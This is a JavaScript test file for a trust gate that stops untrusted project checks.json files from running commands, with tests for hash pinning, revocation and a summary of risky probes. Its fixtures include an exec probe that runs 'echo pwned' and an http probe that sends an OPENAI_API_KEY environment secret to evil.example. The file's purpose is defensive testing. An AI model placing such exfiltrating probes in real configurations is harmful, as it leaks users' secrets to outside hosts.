import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { loadChecks, cwdOverrideInfo } from '../src/engine.js';
import { trustDir, untrustDir, listTrusted, isTrusted, normDir, trustedChecks, summarizeChecks } from '../src/trust.js';

// A cwd/checks.json that runs a command — the exact thing the gate must block.
const rce = (id) => JSON.stringify({
  checks: [{
    id, label: 'x', dimension: 'runtime', tier: 'fast',
    probe: { type: 'exec', cmd: 'echo', args: ['pwned'] },
  }],
});

// Run fn inside an isolated temp project + temp AGENT_DOCTOR_HOME, then restore.
function withProject(fn) {
  const home = mkdtempSync(join(tmpdir(), 'ad-home-'));
  const proj = mkdtempSync(join(tmpdir(), 'ad-proj-'));
  const prevCwd = process.cwd();
  const prevHome = process.env.AGENT_DOCTOR_HOME;
  process.env.AGENT_DOCTOR_HOME = home;
  process.chdir(proj);
  try { return fn({ home, proj }); }
  finally {
    process.chdir(prevCwd);
    if (prevHome === undefined) delete process.env.AGENT_DOCTOR_HOME;
    else process.env.AGENT_DOCTOR_HOME = prevHome;
    rmSync(home, { recursive: true, force: true });
    rmSync(proj, { recursive: true, force: true });
  }
}

test('untrusted cwd/checks.json is ignored by loadChecks (the zero-click RCE guard)', () => {
  withProject(({ proj }) => {
    writeFileSync(join(proj, 'checks.json'), rce('evil:rce'));
    const ids = loadChecks().map((c) => c.id);
    assert.ok(!ids.includes('evil:rce'), 'untrusted cwd check must NOT be loaded');
    const info = cwdOverrideInfo();
    assert.equal(info.present, true);
    assert.equal(info.trusted, false);
    assert.equal(info.count, 1);
  });
});

test('after `trust`, cwd checks load; editing the file re-locks (hash pin)', () => {
  withProject(({ proj }) => {
    const file = join(proj, 'checks.json');
    writeFileSync(file, rce('evil:rce'));
    const res = trustDir(proj);
    assert.equal(res.ok, true);
    assert.equal(isTrusted(proj), true);
    assert.ok(loadChecks().map((c) => c.id).includes('evil:rce'), 'trusted cwd check should load');

    // Edit the file -> hash no longer matches -> gated again.
    writeFileSync(file, rce('evil:rce2'));
    assert.equal(isTrusted(proj), false, 'edited file must re-lock');
    const ids = loadChecks().map((c) => c.id);
    assert.ok(!ids.includes('evil:rce2'), 'edited (untrusted) cwd check must NOT load');
    const row = listTrusted().find((r) => r.path === normDir(proj));
    assert.equal(row.status, 'stale');
  });
});

test('`untrust` revokes and the checks stop loading', () => {
  withProject(({ proj }) => {
    writeFileSync(join(proj, 'checks.json'), rce('evil:rce'));
    trustDir(proj);
    assert.equal(isTrusted(proj), true);
    const { removed } = untrustDir(proj);
    assert.equal(removed, true);
    assert.equal(isTrusted(proj), false);
    assert.ok(!loadChecks().map((c) => c.id).includes('evil:rce'));
  });
});

test('no cwd/checks.json -> not trusted, no override notice', () => {
  withProject(({ proj }) => {
    assert.equal(isTrusted(proj), false);
    assert.equal(cwdOverrideInfo().present, false);
  });
});

test('trust is path-scoped: trusting one dir does not trust a sibling with identical content', () => {
  withProject(({ proj }) => {
    writeFileSync(join(proj, 'checks.json'), rce('evil:rce'));
    trustDir(proj);
    const sibling = mkdtempSync(join(tmpdir(), 'ad-sib-'));
    try {
      writeFileSync(join(sibling, 'checks.json'), rce('evil:rce')); // same bytes, different path
      assert.equal(isTrusted(sibling), false, 'identical content in another dir must not inherit trust');
    } finally {
      rmSync(sibling, { recursive: true, force: true });
    }
  });
});

test('builtin checks still load normally after the gate (no regression)', () => {
  withProject(() => {
    const ids = loadChecks().map((c) => c.id);
    assert.ok(ids.includes('agent-cli:claude'), 'builtins must be unaffected by the cwd gate');
  });
});

// trustedChecks: the single-read trusted-execution entry point. It hashes and parses
// the SAME buffer, so the bytes verified against the pin are the exact bytes returned
// (no isTrusted-then-reparse double read a racing writer could split).
test('trustedChecks returns parsed checks only when trusted, and fails closed otherwise', () => {
  withProject(({ proj }) => {
    const file = join(proj, 'checks.json');

    // Untrusted: no parse leaks out.
    writeFileSync(file, rce('evil:rce'));
    assert.equal(trustedChecks(proj), null, 'untrusted file must return null (nothing to run)');

    // Trusted: returns the parsed object; its checks are exactly what loadChecks runs.
    trustDir(proj);
    const t = trustedChecks(proj);
    assert.ok(t && Array.isArray(t.checks), 'trusted file must return a parsed { checks: [...] }');
    assert.deepEqual(
      t.checks.map((c) => c.id),
      loadChecks().filter((c) => c.id === 'evil:rce').map((c) => c.id),
      'trustedChecks output is the same content loadChecks executes (single source of truth)',
    );

    // Edited after trust: hash no longer matches the pin -> fails closed on the same read.
    writeFileSync(file, rce('evil:rce2'));
    assert.equal(trustedChecks(proj), null, 'edited (unpinned) file must return null');
  });
});

test('trustedChecks returns null for a missing checks.json', () => {
  withProject(({ proj }) => {
    assert.equal(trustedChecks(proj), null);
  });
});

// The `trust` consent line must not understate capability: memwrite is command-capable
// (sqlite3 CLI .shell/.system), and an http probe with ${ENV:VAR} can exfiltrate a secret.
test('summarizeChecks discloses command-capable and secret-exfil checks honestly', () => {
  const dir = mkdtempSync(join(tmpdir(), 'ad-sum-'));
  const file = join(dir, 'checks.json');
  try {
    writeFileSync(file, JSON.stringify({ checks: [
      { id: 'a', probe: { type: 'exec', cmd: 'node', args: ['-v'] } },
      { id: 'b', probe: { type: 'mcp', config: '~/.claude.json' } },
      { id: 'c', probe: { type: 'memwrite', db: '~/x.db', writesQuery: 'SELECT 1', inputsQuery: 'SELECT 1' } },
      { id: 'd', probe: { type: 'http', url: 'https://evil.example/?k=${ENV:OPENAI_API_KEY}' } },
      { id: 'e', probe: { type: 'http', url: 'https://ok.example', headers: { Authorization: 'Bearer ${ENV:TOKEN}' } } },
      { id: 'f', probe: { type: 'http', url: 'https://plain.example' } }, // no ${ENV} -> not exfil
      { id: 'g', probe: { type: 'port', host: '127.0.0.1', port: 8000 } }, // neither
      { id: 'h', probe: { type: 'fileJson', path: '~/.claude/settings.json' } }, // neither
    ] }));
    const s = summarizeChecks(file);
    assert.equal(s.total, 8);
    assert.equal(s.runCmd, 3, 'exec + mcp + memwrite are command-capable');
    assert.equal(s.exfil, 2, 'the two http checks with ${ENV:...} in url/headers can send a secret');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});
